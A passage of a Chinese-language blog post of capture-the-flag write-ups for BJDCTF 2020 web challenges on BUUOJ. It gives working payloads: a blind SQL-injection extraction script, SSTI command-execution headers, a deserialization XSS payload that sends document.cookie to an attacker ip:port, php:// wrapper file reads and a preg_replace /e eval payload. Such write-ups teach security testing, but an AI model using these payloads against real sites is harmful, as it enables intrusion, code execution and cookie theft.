<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Only u input the correct password then u can get the flag</span><br><span class="line">and p3rh4ps wants a girl friend.</span><br><span class="line"></span><br><span class="line">select * from users where username&#x3D;&#39;$_POST[&quot;username&quot;]&#39; and password&#x3D;&#39;$_POST[&quot;password&quot;]&#39;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;出题人四级压线才过 见谅见谅 领会精神</span><br></pre></td></tr></table></figure>
<p>fuzz一下，可以看到ban了很多字符，应该是黑名单过滤，part of blaklist：</p>
<ul>
<li>单引号双引号</li>
<li>union，select，rand，and，=，like，mid</li>
</ul>
<p>但是没有ban括号，可以使用很多函数，没有ban反斜线，根据hint的查询语句，可以用反斜线转义掉单引号，而且没有ban井号注释符</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username=\</span><br><span class="line">password= or 1<span class="comment">#</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">&#x27;\&#x27;</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">&#x27; or 1#&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>可以看到回显变了，应该是登陆成功了，但是hint说只能用正确的密码才能getflag，页面只有正常和错误两种回显，考虑布尔盲注，y1ng大佬的wp说要用正则注入，不知道为啥，我用的ascii函数和&lt;&gt;进行的判断，直接注的密码，附上python脚本：（写的乱七八糟，凑合看吧。。。）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s=<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">s+=s.lower()</span><br><span class="line">s+=<span class="string">&#x27;0123456789&#x27;</span></span><br><span class="line">ans=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    si=<span class="built_in">str</span>(i)</span><br><span class="line">    print(<span class="string">&#x27;trying &#x27;</span>+si)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> s:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;\\&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27; or ascii(right(left(password,&#x27;</span>+si+<span class="string">&#x27;),1))&lt;&gt;&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">ord</span>(x))+<span class="string">&#x27;#&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(<span class="string">&#x27;http://337cb763-c5b3-4c33-86be-7978eaac7a70.node3.buuoj.cn/index.php&#x27;</span>,data=data)</span><br><span class="line">        <span class="comment">#print(data)</span></span><br><span class="line">        <span class="comment">#print(res.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You konw ,P3rh4ps needs a girl friend&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            ans+=x</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(ans)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(ans)==<span class="number">12</span>:<span class="comment">#用length()判断出password长度为12</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">password:<span class="string">&#x27;OhyOuFOuNdit&#x27;</span>用这个密码登陆就有flag了</span><br></pre></td></tr></table></figure>
<h3 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h3><p>打开靶机之后，显示有flag页面，打开之后回显：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">your ip is:xxxxxxx</span><br></pre></td></tr></table></figure>
<p>hint.php中有注释</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">do you know why i know your ip?</span><br></pre></td></tr></table></figure>
<p>然后我在burp加了个XFF头，果然ip变了，Client-IP也可以，然后就没思路了，XFF头中写phpinfo()但是没办法执行，顶不住了，百度了下题解，原来是ssti注入，总之就是在header中添加<code>&#123;&#123;code&#125;&#125;</code>就可以了，<code>&#123;&#123;phpinfo()&#125;&#125;</code>就可以执行成功</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Client-IP: &#123;&#123;system(&#39;ls &#x2F;&#39;)&#125;&#125;</span><br><span class="line">Client-IP: &#123;&#123;system(&#39;cat &#x2F;flag&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>参考<br><a href='https://zhuanlan.zhihu.com/p/28823933' target='_blank' rel="noopener noreferrer">服务端模板注入攻击</a></p>
<h3 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h3><p>和上一题的前端界面很像，但是是和cookie相关的，尝试ssti注入，登录后在cookie中有个user字段，将值改为<code>&#123;&#123;7*7&#125;&#125;</code>返回<code>hello 49</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*&#39;7&#39;&#125;&#125;</span><br><span class="line">jinja输出7777777</span><br><span class="line">twig输出49</span><br></pre></td></tr></table></figure>


<p>但是有过滤</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user&#x3D;&#123;&#123;phpinfo()&#125;&#125;</span><br><span class="line">回显:</span><br><span class="line">What do you want to do?!</span><br></pre></td></tr></table></figure>
<p>题解上的payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat &#x2F;flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>其中cat /flag是执行命令的点，这个页面貌似只能显示一行结果，也就是说，如果执行ls /的话，其实回显只有一个var，看样子是只给显示命令执行结果的最后一行内容，可以用管道符连接head命令一起执行（tail也可以）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls &#x2F;|head -n 4</span><br><span class="line">回显中可以看到有一个flag文件，也就是说，ls命令的第四行结果是flag</span><br></pre></td></tr></table></figure>
<p>或者执行命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -name flag</span><br><span class="line">回显：&#x2F;flag</span><br></pre></td></tr></table></figure>
<p>下图中的测试方法可用于判断使用的模板引擎<br><img src="http://ueverglow.top/wp-content/uploads/2020/03/v2-3321f46859c0be9e93f9ad79f3dd1cd3_1200x500.jpg"></p>
<p>参考：<br><a href='https://zhuanlan.zhihu.com/p/28823933' target='_blank' rel="noopener noreferrer">服务端模板注入攻击</a><br><a href='https://www.freebuf.com/vuls/83999.html' target='_blank' rel="noopener noreferrer">服务端模板注入攻击 （SSTI）之浅析</a></p>
<h3 id="BJDCTF-2nd-xss之光"><a href="#BJDCTF-2nd-xss之光" class="headerlink" title="[BJDCTF 2nd]xss之光"></a>[BJDCTF 2nd]xss之光</h3><p>打开前端，啥都没有，已有一句gungungun，好暴躁。。<br>githack扫一下，可以扫到index</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;yds_is_so_beautiful&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> unserialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
<p>反序列化，在网上找了题解，因为是echo反序列化的结果，所以要利用php中一些有_toString()方法的类，在_toString()的原生类反序列化中，常用的是Error和Exception。</p>
<p>附上Y1ng大佬的payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$y1ng</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;&quot;&lt;script&gt;window.open(\&#x27;[ip]:[port]/?\&#x27;+document.cookie);&lt;/script&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$y1ng</span>));</span><br></pre></td></tr></table></figure>
<p>buuoj上复现的题目不需要nc监听，直接在response的cookie中就可以getflag</p>
<h3 id="BJDCTF-2nd-Schrödinger"><a href="#BJDCTF-2nd-Schrödinger" class="headerlink" title="[BJDCTF 2nd]Schrödinger"></a>[BJDCTF 2nd]Schrödinger</h3><p>打开之后</p>
<p>“<br>Welcome to imagin’s Schrödinger Login Fucker!</p>
<p>It’s the most beautiful interface I can write（’▿’）</p>
<p>Intro:</p>
<p>You can give a wibsite to this page and this page will automatically identify various parameters of the target and try to burst the password.</p>
<p>The longer the compute time is, the higher the success rate of the burst is.</p>
<p>But before the final result is checked, no one knows whether to burst out the password. We call it the superposition state of burst and unburst</p>
<p>You can check the progress at any time, but once you check the progress, this website will stop bursting and delete the relevant progress, which we call the collapse of the superposition state.</p>
<p>If the CPU of the server is idle, it must be able to burst out the password you want very soon :)</p>
<p>Enjoy it!</p>
<p>imagin@1580308166<br>Note : Remenmber to remove test.php!</p>
<p>input a victim<br>Load of Server CPU90.58322228388658%<br>Already burst 79 sec, 130365 p/s<br>Forecast success rate 20.536404906595003%<br>“<br>其中note是纯白色的，一开始还没发现，在源代码中可以看到，尝试爆破<code>test.php</code>，输入参数<code>http://127.0.0.1/test.php</code></p>
<p>然后开始爆破之后点check，修改cookie中base64编码的时间戳，可以回显B站av号，评论区getflag</p>
<h3 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h3><p>打开页面后是源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//next.php</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>利用php伪协议<br>传递参数如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">get:</span><br><span class="line">text=php:<span class="comment">//input&amp;file=php://filter/read=convert.base64-encode/resource=next.php</span></span><br><span class="line">post:</span><br><span class="line">I have a dream</span><br></pre></td></tr></table></figure>
<p>还可以</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">？text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,I%20have%20a%20dream&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64- encode&#x2F;resource&#x3D;next.php</span><br></pre></td></tr></table></figure>
<p>结果base64解码可以知道next.php的源代码是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接下来是利用<code>preg_replace()</code>函数在<code>/e</code>模式下工作存在代码执行的漏洞，payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?\S*&#x3D;$&#123;getFlag()&#125;&amp;cmd&#x3D;system(&#39;cat &#x2F;flag&#39;);&#x2F;&#x2F;或者show_source()函数也行</span><br><span class="line"></span><br><span class="line">or</span><br><span class="line"></span><br><span class="line">?\S*&#x3D;$&#123;eval($_POST[xxx])&#125;</span><br><span class="line">post: xxx&#x3D;system(&#39;cat &#x2F;flag&#39;);</span><br></pre></td></tr></table></figure>
<p>参考：<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12328083.html">https://www.cnblogs.com/wangtanzhi/p/12328083.html</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a></p>
<h3 id="部分wp"><a href="#部分wp" class="headerlink" title="部分wp:"></a>部分wp:</h3><p><a target="_blank" rel="noopener" href="https://www.gem-love.com/ctf/2097.html">某大佬的wp</a><br><a target="_blank" rel="noopener" href="https://imagin.vip/?p=166" title="另一个大佬的wp">另一个大佬的wp</a><br><a target="_blank" rel="noopener" href="https://www.ctfwp.com/%E5%AE%98%E6%96%B9%E8%B5%9B%E4%BA%8B%E9%A2%98/2020%E7%AC%AC%E4%BA%8C%E5%B1%8ABJDCTF" title="官方wp">官方wp</a><br><a target="_blank" rel="noopener" href="https://github.com/BjdsecCA/BJDCTF2020_March" title="官方wp（github）">官方wp（github）</a></p>
<p>题目源码：<br><a target="_blank" rel="noopener" href="https://github.com/BjdsecCA/BJDCTF2020_January">BJDCTF</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:1582612801@qq.com">R4in1</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://r4in1.github.io/2020/12/02/%E8%AE%B0BJDCTF-on-BUUOJ/">https://r4in1.github.io/2020/12/02/%E8%AE%B0BJDCTF-on-BUUOJ/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://r4in1.github.io" target="_blank">R4in1's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2020/12/02/eymZfANBkTcHSrl.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/12/02/CUMTCTF2020-WP-by-Last-W1z4rd/"><img class="prev-cover" src="https://i.loli.net/2020/12/02/eymZfANBkTcHSrl.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">CUMTCTF2020-WP by Last_W1z4rd</div></div></a></div><div class="next-post pull-right"><a href="/2020/12/02/BUUCTF%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"><img class="next-cover" src="https://i.loli.net/2020/12/02/eymZfANBkTcHSrl.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">BUUCTF web部分题解</div></div></a></div></nav></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/R4in1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">R4in1</div><div class="author-info__description">Life has a beautiful, crazy design.</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/R4in1"><i class="fab fa-github"></i><span>Follow Me</span></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF-2nd-%E7%AD%BE%E5%88%B0-y1ng"><span class="toc-number">1.</span> <span class="toc-text">[BJDCTF 2nd]签到-y1ng</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF-2nd-fake-google"><span class="toc-number">2.</span> <span class="toc-text">[BJDCTF 2nd]fake google</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF-2nd-old-hack"><span class="toc-number">3.</span> <span class="toc-text">[BJDCTF 2nd]old-hack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF2020-Easy-MD5"><span class="toc-number">4.</span> <span class="toc-text">[BJDCTF2020]Easy MD5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF-2nd-%E5%81%87%E7%8C%AA%E5%A5%97%E5%A4%A9%E4%B8%8B%E7%AC%AC%E4%B8%80"><span class="toc-number">5.</span> <span class="toc-text">[BJDCTF 2nd]假猪套天下第一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF-2nd-duangShell"><span class="toc-number">6.</span> <span class="toc-text">[BJDCTF 2nd]duangShell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF2020-Mark-loves-cat"><span class="toc-number">7.</span> <span class="toc-text">[BJDCTF2020]Mark loves cat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF-2nd-%E7%AE%80%E5%8D%95%E6%B3%A8%E5%85%A5"><span class="toc-number">8.</span> <span class="toc-text">[BJDCTF 2nd]简单注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF2020-The-mystery-of-ip"><span class="toc-number">9.</span> <span class="toc-text">[BJDCTF2020]The mystery of ip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF2020-Cookie-is-so-stable"><span class="toc-number">10.</span> <span class="toc-text">[BJDCTF2020]Cookie is so stable</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF-2nd-xss%E4%B9%8B%E5%85%89"><span class="toc-number">11.</span> <span class="toc-text">[BJDCTF 2nd]xss之光</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF-2nd-Schro%CC%88dinger"><span class="toc-number">12.</span> <span class="toc-text">[BJDCTF 2nd]Schrödinger</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4"><span class="toc-number">13.</span> <span class="toc-text">[BJDCTF2020]ZJCTF，不过如此</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%83%A8%E5%88%86wp"><span class="toc-number">14.</span> <span class="toc-text">部分wp:</span></a></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2020/12/02/BUUCTF-CRYPTO%E5%88%86%E7%B1%BB%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" title="BUUCTF CRYPTO分类部分题解"><img src="https://i.loli.net/2020/12/02/eymZfANBkTcHSrl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUUCTF CRYPTO分类部分题解"/></a><div class="content"><a class="title" href="/2020/12/02/BUUCTF-CRYPTO%E5%88%86%E7%B1%BB%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" title="BUUCTF CRYPTO分类部分题解">BUUCTF CRYPTO分类部分题解</a><time datetime="2020-12-02T12:47:28.000Z" title="发表于 2020-12-02 20:47:28">2020-12-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/12/02/CUMTCTF2020-WP-by-Last-W1z4rd/" title="CUMTCTF2020-WP by Last_W1z4rd"><img src="https://i.loli.net/2020/12/02/eymZfANBkTcHSrl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CUMTCTF2020-WP by Last_W1z4rd"/></a><div class="content"><a class="title" href="/2020/12/02/CUMTCTF2020-WP-by-Last-W1z4rd/" title="CUMTCTF2020-WP by Last_W1z4rd">CUMTCTF2020-WP by Last_W1z4rd</a><time datetime="2020-12-02T12:44:54.000Z" title="发表于 2020-12-02 20:44:54">2020-12-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/12/02/%E8%AE%B0BJDCTF-on-BUUOJ/" title="记BJDCTF on BUUOJ"><img src="https://i.loli.net/2020/12/02/eymZfANBkTcHSrl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="记BJDCTF on BUUOJ"/></a><div class="content"><a class="title" href="/2020/12/02/%E8%AE%B0BJDCTF-on-BUUOJ/" title="记BJDCTF on BUUOJ">记BJDCTF on BUUOJ</a><time datetime="2020-12-02T12:37:25.000Z" title="发表于 2020-12-02 20:37:25">2020-12-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/12/02/BUUCTF%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" title="BUUCTF web部分题解"><img src="https://i.loli.net/2020/12/02/eymZfANBkTcHSrl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUUCTF web部分题解"/></a><div class="content"><a class="title" href="/2020/12/02/BUUCTF%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" title="BUUCTF web部分题解">BUUCTF web部分题解</a><time datetime="2020-12-02T12:26:04.000Z" title="发表于 2020-12-02 20:26:04">2020-12-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/12/02/SQL-libs-1-N/" title="SQL-libs 1-?"><img src="https://i.loli.net/2020/12/02/eymZfANBkTcHSrl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SQL-libs 1-?"/></a><div class="content"><a class="title" href="/2020/12/02/SQL-libs-1-N/" title="SQL-libs 1-?">SQL-libs 1-?</a><time datetime="2020-12-02T12:01:05.000Z" title="发表于 2020-12-02 20:01:05">2020-12-02</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By R4in1</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script></div></body></html>